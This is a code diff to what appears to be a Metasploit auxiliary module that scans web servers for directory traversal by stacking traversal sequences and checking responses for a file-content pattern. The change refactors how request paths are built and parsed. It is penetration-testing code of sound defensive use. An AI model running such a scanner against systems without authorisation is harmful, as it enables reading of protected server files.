@@ -100,8 +100,9 @@ class Metasploit3 < Msf::Auxiliary
 			1.upto(depth) do |d|
 				file_to_read.each do |f|
 					trigger = base * d
-					req = ini_request(datastore['PATH'] + trigger + f)
-					vprint_status("Trying: http://#{rhost}:#{rport}#{req['uri']}")
+					p = datastore['PATH'] + trigger + f
+					req = ini_request(p)
+					vprint_status("Trying: http://#{rhost}:#{rport}#{p}")
 					res = send_request_cgi(req, 25)
 					return trigger if res and res.to_s =~ datastore['PATTERN']
 				end
@@ -137,8 +138,18 @@ class Metasploit3 < Msf::Auxiliary
 		when 'HEAD'
 		end
 
+		if not req['vars_get'].nil? or not req['vars_post'].nil? or not req['data'].nil?
+			begin
+				this_path = URI(uri).path
+			rescue ::URI::InvalidURIError
+				this_path = uri.scan(/^(.+)\?*.*/).flatten[0]
+			end
+		else
+			this_path = uri
+		end
+
 		req['method']     = datastore['METHOD']
-		req['uri']        = uri
+		req['uri']        = this_path
 		req['headers']    = {'Cookie'=>datastore['COOKIE']} if not datastore['COOKIE'].empty?
 		req['data']       = datastore['DATA'] if not datastore['DATA'].empty?
 		req['basic_auth'] = datastore['BASICAUTH'] if not datastore['BASICAUTH'].empty?
